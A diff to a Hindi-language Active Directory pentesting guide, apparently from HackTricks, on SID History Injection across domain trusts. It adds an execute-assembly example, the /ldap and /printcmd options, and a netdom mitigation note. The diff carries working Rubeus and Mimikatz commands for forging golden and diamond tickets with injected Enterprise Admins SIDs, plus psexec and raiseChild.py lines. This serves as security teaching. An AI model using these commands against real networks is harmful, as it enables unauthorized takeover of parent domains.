@@ -4,19 +4,47 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में सहायता करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे Enterprise Admins या Domain Admins) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। इस शोषण से माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच मिलती है।
+**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में मदद करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे Enterprise Admins या Domain Admins) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। यह शोषण माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच प्रदान करता है।
 
-इस हमले को निष्पादित करने के लिए दो तरीके हैं: या तो **Golden Ticket** या **Diamond Ticket** का निर्माण करके।
+इस हमले को निष्पादित करने के लिए दो तरीके हैं: या तो **Golden Ticket** या **Diamond Ticket** बनाने के माध्यम से।
 
-**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन का SID ढूंढना होगा। पहचान के बाद, Enterprise Admins समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।
+**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन के SID को ढूंढना होगा। पहचान के बाद, Enterprise Admins समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।
 
 आप **Domain Admins** समूहों का भी उपयोग कर सकते हैं, जो **512** पर समाप्त होता है।
 
 दूसरे डोमेन के एक समूह (उदाहरण के लिए "Domain Admins") का SID खोजने का एक और तरीका है:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-### गोल्डन टिकट (Mimikatz) KRBTGT-AES256 के साथ
+> [!WARNING]
+> ध्यान दें कि एक ट्रस्ट संबंध में SID इतिहास को अक्षम करना संभव है, जिससे यह हमला विफल हो जाएगा।
+
+[**docs**](https://technet.microsoft.com/library/cc835085.aspx) के अनुसार:
+- **नेटडॉम टूल का उपयोग करके फॉरेस्ट ट्रस्ट पर SIDHistory को अक्षम करना** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **नेटडॉम टूल का उपयोग करके बाहरी ट्रस्ट पर SID फ़िल्टर क्वारंटाइन लागू करना** (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **एकल फॉरेस्ट के भीतर डोमेन ट्रस्ट पर SID फ़िल्टरिंग लागू करना** अनुशंसित नहीं है क्योंकि यह एक असमर्थित कॉन्फ़िगरेशन है और इससे तोड़ने वाले परिवर्तन हो सकते हैं। यदि एक फॉरेस्ट के भीतर एक डोमेन अविश्वसनीय है, तो इसे फॉरेस्ट का सदस्य नहीं होना चाहिए। इस स्थिति में, पहले विश्वसनीय और अविश्वसनीय डोमेन को अलग-अलग फॉरेस्ट में विभाजित करना आवश्यक है जहां SID फ़िल्टरिंग को इंटरफॉरेस्ट ट्रस्ट पर लागू किया जा सके।
+
+इस बारे में अधिक जानकारी के लिए इस पोस्ट की जांच करें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### डायमंड टिकट (Rubeus + KRBTGT-AES256)
+
+अंतिम बार जब मैंने यह कोशिश की थी, तो मुझे आर्ग **`/ldap`** जोड़ने की आवश्यकता थी।
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
+```
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -39,16 +67,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 golden-ticket.md
 {{#endref}}
 
-### डायमंड टिकट (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 डायमंड टिकट के बारे में अधिक जानकारी के लिए देखें:
 
 {{#ref}}
@@ -109,10 +128,10 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 प्रवाह है:
 
 - माता-पिता के डोमेन के एंटरप्राइज एडमिन्स समूह के लिए SID प्राप्त करता है
-- बच्चे के डोमेन में KRBTGT खाते के लिए हैश प्राप्त करता है
+- बच्चे के डोमेन में KRBTGT खाते के लिए हैश पुनः प्राप्त करता है
 - एक गोल्डन टिकट बनाता है
 - माता-पिता के डोमेन में लॉग इन करता है
-- माता-पिता के डोमेन में व्यवस्थापक खाते के लिए क्रेडेंशियल्स प्राप्त करता है
+- माता-पिता के डोमेन में व्यवस्थापक खाते के लिए क्रेडेंशियल्स पुनः प्राप्त करता है
 - यदि `target-exec` स्विच निर्दिष्ट किया गया है, तो यह Psexec के माध्यम से माता-पिता के डोमेन के डोमेन कंट्रोलर पर प्रमाणीकरण करता है।
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
